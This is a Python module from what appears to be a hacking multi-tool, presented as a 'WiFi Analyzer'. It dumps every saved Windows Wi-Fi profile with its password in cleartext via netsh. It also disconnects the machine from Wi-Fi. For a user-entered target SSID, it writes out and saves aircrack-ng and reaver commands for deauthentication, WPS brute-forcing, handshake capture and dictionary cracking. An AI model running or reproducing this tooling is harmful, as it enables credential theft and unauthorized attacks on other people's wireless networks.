from Config.Util import *
from Config.Config import *
try:
    import subprocess
    import re
    import time
except Exception as e:
    ErrorModule(e)

Title("WiFi Analyzer")

try:
    def scan_wifi_networks():
        if not sys.platform.startswith("win"):
            OnlyWindows()
            return
        
        try:
            # Get available networks
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                  capture_output=True, text=True, encoding='utf-8')
            
            if result.returncode != 0:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} WiFi adapter not found or disabled")
                return
            
            # Extract network names
            networks = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line:
                    network_name = line.split(':')[1].strip()
                    networks.append(network_name)
            
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Found {white}{len(networks)}{red} saved networks")
            
            for network in networks:
                try:
                    # Get detailed info for each network
                    detail_result = subprocess.run(['netsh', 'wlan', 'show', 'profile', network, 'key=clear'], 
                                                 capture_output=True, text=True, encoding='utf-8')
                    
                    if detail_result.returncode == 0:
                        # Parse network details
                        ssid = network
                        auth_type = "Unknown"
                        cipher = "Unknown"
                        password = "Not found"
                        
                        for line in detail_result.stdout.split('\n'):
                            if 'Authentication' in line:
                                auth_type = line.split(':')[1].strip()
                            elif 'Cipher' in line:
                                cipher = line.split(':')[1].strip()
                            elif 'Key Content' in line:
                                password = line.split(':')[1].strip()
                        
                        print(f"""
{BEFORE + current_time_hour() + AFTER} {ADD} Network: {white}{ssid}{red}
    Authentication: {white}{auth_type}{red}
    Cipher: {white}{cipher}{red}
    Password: {white}{password}{red}""")
                        
                except Exception as e:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error getting details for {white}{network}{red}")
                    
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error scanning WiFi: {white}{e}")

    def scan_nearby_networks():
        if not sys.platform.startswith("win"):
            OnlyWindows()
            return
            
        try:
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Scanning nearby networks...")
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                  capture_output=True, text=True, encoding='utf-8')
            
            # Refresh available networks
            subprocess.run(['netsh', 'wlan', 'disconnect'], capture_output=True)
            time.sleep(2)
            
            scan_result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                       capture_output=True, text=True, encoding='utf-8')
            
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} WiFi Interface Status:")
            print(scan_result.stdout)
            
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error scanning nearby networks: {white}{e}")

    def generate_wifi_attack_commands(ssid):
        commands = [
            f"# Deauth attack (requires aircrack-ng suite)",
            f"airmon-ng start wlan0",
            f"airodump-ng wlan0mon",
            f"aireplay-ng --deauth 10 -a [BSSID] wlan0mon",
            f"",
            f"# WPS attack",
            f"reaver -i wlan0mon -b [BSSID] -vv",
            f"",
            f"# Handshake capture",
            f"airodump-ng -c [CHANNEL] --bssid [BSSID] -w {ssid} wlan0mon",
            f"aireplay-ng --deauth 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon",
            f"",
            f"# Dictionary attack",
            f"aircrack-ng -w /path/to/wordlist.txt {ssid}-01.cap",
        ]
        return commands

    Slow(wifi_banner)
    
    print(f"""
 {BEFORE}01{AFTER}{white} Scan saved WiFi networks
 {BEFORE}02{AFTER}{white} Scan nearby networks  
 {BEFORE}03{AFTER}{white} Generate attack commands
    """)
    
    choice = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Option -> {reset}")
    
    if choice in ['1', '01']:
        scan_wifi_networks()
    elif choice in ['2', '02']:
        scan_nearby_networks()
    elif choice in ['3', '03']:
        ssid = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Target SSID -> {reset}")
        commands = generate_wifi_attack_commands(ssid)
        
        output_file = os.path.join(tool_path, "1-Output", "WiFiAttack", f"attack_commands_{ssid}.txt")
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"# WiFi Attack Commands for {ssid}\n")
            f.write(f"# Generated by {name_tool} at {current_time_day_hour()}\n\n")
            for command in commands:
                f.write(command + "\n")
        
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Attack commands:")
        for command in commands:
            if command.startswith('#'):
                print(f"{yellow}{command}")
            else:
                print(f"{white}{command}")
        
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Commands saved to: {white}{output_file}")
    else:
        ErrorChoice()

    Continue()
    Reset()
except Exception as e:
    Error(e)